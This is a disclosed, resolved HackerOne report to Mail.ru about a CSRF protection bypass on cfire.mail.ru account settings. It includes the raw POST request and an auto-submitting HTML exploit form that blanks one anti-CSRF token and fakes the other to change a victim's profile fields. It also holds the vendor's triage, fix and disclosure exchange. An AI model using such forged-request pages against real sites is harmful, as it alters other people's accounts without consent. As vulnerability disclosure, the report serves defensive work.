{"id":161408,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjE0MDg=","url":"https://hackerone.com/reports/161408","title":"[cfire.mail.ru] CSRF Bypassed - Changing anyone's 'User Info'","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-08-19T18:47:08.275Z","submitted_at":"2016-08-19T18:47:08.275Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ahsan","url":"/ahsan","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-09T15:39:10.934Z","bug_reporter_agreed_on_going_public_at":"2016-08-23T15:42:35.485Z","team_member_agreed_on_going_public_at":"2016-09-09T15:39:10.787Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nI noticed that when we change `userinfo` of https://cfire.mail.ru from here: [https://cfire.mail.ru/account/#userinfo], there are two Anti-CSRF tokens (or you can say that; they just do the work of Anti-CSRF token): \n- `signature`\n- `submit2`\n\nActually, I was able to bypass both Anti-CSRF tokens, and after the bypass, I was able to change anyone's user info (e.g First Name)\n\n#PoC\nServer-side authentication of CSRF token isn't properly validating the Anti-CSRF tokens/values in the `signature` and `submit2` parameters of the POST request when changing user info of a https://cfire.mail.ru account.\n\n##HTTP POST REQUEST:\n```\nPOST /account/ HTTP/1.1\nHost: cfire.mail.ru\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://cfire.mail.ru/account/\nCookie: \u003ccookies-here.\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 167\n\nsignature=\u003ccsrf-token here\u003e\u0026firstname=Hacked\u0026lastname=\u0026bdday=0\u0026bdmonth=0\u0026bdyear=0\u0026postindex=\u0026country=\u0026city=\u0026address=\u0026submit2=\u003canother 9-character csrf-token here\u003e\n```\n\nRemoving the value of `signature` AND changing the value of `submit2` to `XXXXXXXXX` will bypass both protections ;) \n\n##Exploit Code:\nSo, we can exploit it with the following code:\n\n```\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://cfire.mail.ru/account/\" method=\"POST\" name=\"exploit\"\u003e\n      \u003cinput type=\"hidden\" name=\"signature\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"firstname\" value=\"Pwn3d\" /\u003e\n      \u003cinput type=\"hidden\" name=\"lastname\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bdday\" value=\"0\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bdmonth\" value=\"0\" /\u003e\n      \u003cinput type=\"hidden\" name=\"bdyear\" value=\"0\" /\u003e\n      \u003cinput type=\"hidden\" name=\"postindex\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"country\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"city\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"address\" value=\"\" /\u003e\n      \u003cinput type=\"hidden\" name=\"submit2\" value=\"XXXXXXXXX\" /\u003e\n    \u003c/form\u003e\n\t\u003cscript\u003edocument.exploit.submit()\u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nIn the above exploit code, only the value of Fist Name will be changed, but any value can be changed; you just have to edit the code, and change the value of the parameters! \n\n**P.S:** *I used JavaScript to execute the code; so only by accessing a page with the code will change the first name to `Pwn3d`*\n\nSo, if you execute the above code locally in your browser; your first name will be changed to `Pwn3d`.\n\n###Testing Environment\n\u003e**Browser:** Firefox [version 45.0]\n**OS:** Windows 8.1\n**User Agent:** Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\n\nIf you have any other questions or if anything needs clarification, please let me know. âœŒ\n\nCheers,\nAhsan\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-22T15:42:35.537Z","allow_singular_disclosure_after":-159401124.7973982,"singular_disclosure_allowed":true,"vote_count":15,"voters":["zee_shan","bugdiscloseguys","an0nym0us","hussain_0x3c","m16","dineshvicky","kiraak-boy","jens","fantam1","tayyabqadir_tqss","and 5 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1141002,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for reporting your bug to Mail.Ru Group!   We appreciate your time for helping us to make our web services safer.\nWe are currently reviewing your submission and will be back in touch soon.\nUnfortunately,  your report is not in a bug bounty program's scope (check the [rules](https://hackerone.com/mailru)), so  we cannot qualify you for monetary reward. We say \"thank you\" for your help and contribution.","automated_response":false,"created_at":"2016-08-19T18:52:51.204Z","updated_at":"2016-08-19T18:52:51.204Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1141003,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2016-08-19T18:53:02.066Z","updated_at":"2016-08-19T18:53:02.066Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1141089,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Wow, looks like Mail.ru has an awesome response efficiency! ðŸ‘Œ\n\nThanks,\nAhsan","automated_response":false,"created_at":"2016-08-19T19:24:01.850Z","updated_at":"2016-08-19T19:24:01.850Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1149317,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Your bug has been fixed! \nPlease confirm that you are no longer able to reproduce the issue. ","automated_response":false,"created_at":"2016-08-23T15:32:17.683Z","updated_at":"2016-08-23T15:32:17.683Z","actor":{"username":"yngwie","cleared":false,"url":"/yngwie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/185/1b6bf6046f42c100e3793d87a8410bc07178fa8f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ahsan","url":"/ahsan"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1149323,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes; fixed, it looks all good from here ;)\n\nCheers,\nAhsan","automated_response":false,"created_at":"2016-08-23T15:36:04.586Z","updated_at":"2016-08-23T15:36:04.586Z","actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1149341,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-08-23T15:42:35.514Z","updated_at":"2016-08-23T15:42:35.514Z","first_to_agree":true,"actor":{"username":"ahsan","cleared":false,"url":"/ahsan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/674/a85d1f36a4d4b4c6269951bc913cc6f4fc3fcb23_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1184810,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-09-09T15:39:10.864Z","updated_at":"2016-09-09T15:39:10.864Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1184811,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-09-09T15:39:11.071Z","updated_at":"2016-09-09T15:39:11.071Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}